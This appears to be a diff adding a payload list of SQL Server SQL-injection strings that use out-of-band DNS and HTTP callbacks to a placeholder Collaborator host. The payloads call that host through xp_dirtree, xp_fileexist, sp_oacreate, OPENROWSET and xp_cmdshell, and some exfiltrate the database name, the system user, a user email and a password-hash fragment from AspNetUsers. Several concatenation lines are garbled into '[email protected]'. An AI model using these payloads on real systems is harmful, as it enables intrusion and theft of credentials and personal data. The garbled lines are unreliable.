@@ -1,0 +1,47 @@
+# ── Out-of-band exfiltration payloads ─────────────────────────────────────────
+# Replace COLLABORATOR with your Burp Collaborator host.
+# These bypass in-band blind scenarios where response differentials are noisy.
+# Monitor Burp Collaborator for DNS and HTTP callbacks.
+
+# ── xp_dirtree DNS (most reliable — works even without HTTP egress) ───────────
+ss'; EXEC master..xp_dirtree '//COLLABORATOR/a'-- wXyW
+ss'; EXEC master..xp_dirtree '//COLLABORATOR/b'-- wXyW
+
+# ── xp_dirtree with data in subdomain (exfil DB name) ────────────────────────
+# The DNS lookup carries DB_NAME() in the subdomain
+ss'; DECLARE @d varchar(255);
+    SET @d=(SELECT DB_NAME());
+    EXEC master..xp_dirtree '//'[email protected]+'COLLABORATOR/a'-- wXyW
+
+# ── xp_fileexist alternative ──────────────────────────────────────────────────
+ss'; EXEC master..xp_fileexist '//COLLABORATOR/a'-- wXyW
+
+# ── sp_oacreate HTTP callback (requires OLE Automation enabled) ───────────────
+ss'; DECLARE @o int;
+    EXEC sp_oacreate 'MSXML2.ServerXMLHTTP', @o OUTPUT;
+    EXEC sp_oamethod @o, 'open', NULL, 'GET',
+         'http://COLLABORATOR/sqli', false;
+    EXEC sp_oamethod @o, 'send'-- wXyW
+
+# ── DNS via OpenRowset (SQL Server 2005+) ─────────────────────────────────────
+ss' AND 1=(SELECT * FROM OPENROWSET('SQLNCLI','server=COLLABORATOR;uid=a;pwd=a',
+           'SELECT 1'))-- wXyW
+
+# ── DNS via linked server query ───────────────────────────────────────────────
+ss'; EXEC master..xp_cmdshell 'nslookup COLLABORATOR'-- wXyW
+
+# ── Data exfil via DNS subdomain — SYSTEM_USER ────────────────────────────────
+ss'; DECLARE @h varchar(255);
+    SET @h=(SELECT REPLACE(SYSTEM_USER,'\\','--'));
+    EXEC master..xp_dirtree '//'[email protected]+'.COLLABORATOR/x'-- wXyW
+
+# ── Data exfil via DNS — first user email ────────────────────────────────────
+ss'; DECLARE @e varchar(255);
+    SET @e=(SELECT TOP 1 REPLACE(Email,'@','--at--') FROM AspNetUsers);
+    EXEC master..xp_dirtree '//'[email protected]+'.COLLABORATOR/x'-- wXyW
+
+# ── Data exfil via DNS — PasswordHash fragment ───────────────────────────────
+# Hashes are long — take first 30 chars
+ss'; DECLARE @ph varchar(255);
+    SET @ph=(SELECT TOP 1 LEFT(PasswordHash,30) FROM AspNetUsers);
+    EXEC master..xp_dirtree '//'[email protected]+'.COLLABORATOR/x'-- wXyW
